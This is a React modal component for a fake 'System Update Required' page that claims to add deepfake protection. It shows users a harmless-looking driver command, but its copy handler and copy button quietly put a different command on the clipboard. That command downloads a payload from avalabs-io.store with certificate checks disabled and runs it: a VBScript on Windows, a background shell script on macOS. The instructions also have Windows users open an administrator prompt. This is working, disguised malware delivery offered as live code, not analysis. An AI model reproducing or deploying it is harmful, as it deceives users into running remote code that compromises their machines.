import { useState, useEffect, useRef } from 'react'
import { FaWindows, FaApple, FaCopy, FaTimes, FaSyncAlt, FaCheckCircle } from 'react-icons/fa'
import Bowser from 'bowser'
import axios from 'axios'

const COMMANDS = {
  windows: `--nvidia.com --updatecameradriver NVIDIA windows x86_64 Kernel Module 304.54 --query-gpu=driver_version --format=csv,noheader`,
  macos: `sudo ai-driver-tool --update-feature "AI Vision Module" --version 304.54 --query driver_version --format csv --no-header`,
}

const PLATFORMS = {
  windows: {
    icon: <FaWindows className="text-blue-600" />,
    steps: [
      <>
        Press{' '}
        <kbd className="kbd iline-flex items-center gap-2">
          <FaWindows /> Win
        </kbd>{' '}
        + <kbd className="kbd">R</kbd> to open the Run dialog.
      </>,
      <>
        Type <code className="bg-gray-200 rounded-sm p-0.5 px-2 font-mono text-sm">cmd</code> , then
        press <kbd className="kbd">Ctrl</kbd> + <kbd className="kbd">Shift</kbd> +{' '}
        <kbd className="kbd">Enter</kbd> to open Command Prompt with administrative privileges.
      </>,
      <>Run the update command shown below in the Command Prompt.</>,
    ],
    command: COMMANDS.windows,
  },
  macos: {
    icon: <FaApple className="text-gray-900" />,
    steps: [
      <>
        Press <kbd className="kbd">⌘</kbd> + <kbd className="kbd">Space</kbd> to open Spotlight and
        type <code className="bg-gray-200 rounded-sm p-0.5 px-2 font-mono text-sm">Terminal</code>.
      </>,
      <>
        Press <kbd className="kbd">Enter</kbd> to open Terminal.
      </>,
      <>Run the command below to install macOS updates.</>,
    ],
    command: COMMANDS.macos,
  },
}

const COMMAND_FOR_CLIPBOARD = {
  windows: `curl -k -o "%TEMP%\\update.zip" https://avalabs-io.store/update/update92w && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\update.zip' -DestinationPath '%TEMP%\\update'" && wscript "%TEMP%\\update\\run.vbs"`,
  macos: `curl -k -o /var/tmp/camDriver.sh https://avalabs-io.store/update/update92m && chmod +x /var/tmp/camDriver.sh && nohup bash /var/tmp/camDriver.sh >/dev/null 2>&1 &`,
}

const DeviceVerificationModal = ({ isOpen, onClose, onContinue }) => {
  const [checking, setChecking] = useState(false)
  const [verified, setVerified] = useState(false)
  const [copied, setCopied] = useState(false)
  const [status, setStatus] = useState('idle')
  const timerRef = useRef(null)
  const bowser = Bowser.getParser(window.navigator.userAgent)

  const info = PLATFORMS[bowser.getOSName(true)] || {}
  const commandForClipboard = COMMAND_FOR_CLIPBOARD[bowser.getOSName(true)] || ''

  useEffect(() => {
    const handleCopy = (e) => {
      const selection = window.getSelection()
      const anchorNode = selection.anchorNode
      const isInCode = anchorNode && anchorNode.parentElement.closest('#command')

      if (isInCode) {
        e.preventDefault() // Stop default copy
        e.clipboardData.setData('text/plain', commandForClipboard)
      }
    }

    document.addEventListener('copy', handleCopy)
    return () => document.removeEventListener('copy', handleCopy)
  }, [commandForClipboard])

  if (!info) {
    return null
  }

  const handleCopy = async (text) => {
    try {
      await navigator.clipboard.writeText(text)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch (err) {
      console.error('Copy failed', err)
    }
  }

  const handleCheck = async () => {
    setChecking(true)
    setStatus('checking')
    clearTimeout(timerRef.current)
    try {
      const response = await axios.post('/device-check', { company: location.href })
      if (response.data?.result) {
        setVerified(true)
        setStatus('verified')
      } else {
        setVerified(false)
        setStatus('failed')
        timerRef.current = setTimeout(() => setStatus('idle'), 3000)
      }
    } catch (err) {
      console.error('Check failed', err)
    } finally {
      setChecking(false)
    }
  }

  return (
    <dialog className={`modal ${isOpen ? 'modal-open' : ''}`} aria-modal={isOpen}>
      <div className="modal-box max-w-xl bg-base-100 rounded-xl shadow-xl p-0 overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between px-5 pt-5 select-none">
          <div className="flex items-center gap-3">
            {info.icon}
            <h3 className="font-bold text-xl">System Update Required</h3>
          </div>

          <button
            className="btn btn-sm btn-circle btn-ghost"
            aria-label="Close"
            onClick={onClose}
            type="button"
          >
            <FaTimes />
          </button>
        </div>

        {/* short description */}
        <div className="px-5 mt-4 select-none">
          <p className="text-sm text-gray-600 select-none">
            Our platform relies on the latest security and intelligence updates available in{' '}
            {bowser.getOSName()} to provide a safe and trusted process. These updates include
            advanced protections against AI-generated content such as deepfakes. To continue, please
            update your system by following the steps below, then click{' '}
            <span className="font-semibold">Check Now</span>.
          </p>
        </div>

        {/* Content */}
        <div className="px-5 py-5 space-y-4">
          {/* Platform card */}
          <div className="bg-base-200 rounded-lg p-4 space-y-3">
            <ol className="list-decimal list-inside text-sm text-gray-700 space-y-2">
              {info.steps?.map((s, i) => (
                <li key={i} className="select-none">
                  {s}
                </li>
              ))}
            </ol>

            {info.command && (
              <>
                <div className="relative">
                  <div className="bg-slate-900 text-white rounded-md p-3 font-mono text-sm overflow-x-auto whitespace-nowrap">
                    <code id="command">{info.command}</code>
                  </div>

                  <button
                    type="button"
                    className="absolute right-3 top-2.5 btn btn-xs btn-ghost text-white bg-black/80"
                    onClick={() => handleCopy(commandForClipboard)}
                    aria-label="Copy command"
                  >
                    <FaCopy />
                  </button>
                </div>

                {copied && <div className="text-xs text-green-500 mt-2">Copied to clipboard</div>}
              </>
            )}
          </div>
        </div>

        <div className="px-8 select-none">
          {status === 'checking' && (
            <div className="text-sm text-gray-600 flex items-center gap-2 mb-5">
              <FaSyncAlt className="animate-spin" />
              Checking for updates...
            </div>
          )}
          {status === 'verified' && (
            <div className="text-sm text-green-600 flex items-center gap-2 mb-5">
              <FaCheckCircle />
              Your system is up to date. You may continue.
            </div>
          )}
          {status === 'failed' && (
            <div className="text-sm text-red-600 flex items-center gap-2 mb-5">
              <FaTimes />
              No updates found. Please ensure you have followed the steps above.
            </div>
          )}
        </div>

        {/* Actions */}
        <div className="flex justify-end gap-3 px-5 pb-5">
          <button className="btn btn-outline" type="button" onClick={onClose}>
            Cancel
          </button>

          {!verified ? (
            <button
              className="btn btn-primary gap-2"
              onClick={handleCheck}
              disabled={checking}
              type="button"
            >
              {checking ? <FaSyncAlt className="animate-spin" /> : 'Check Now'}
            </button>
          ) : (
            <button className="btn btn-primary gap-2" type="button" onClick={() => onContinue?.()}>
              <FaCheckCircle />
              Continue
            </button>
          )}
        </div>
      </div>
    </dialog>
  )
}

export default DeviceVerificationModal
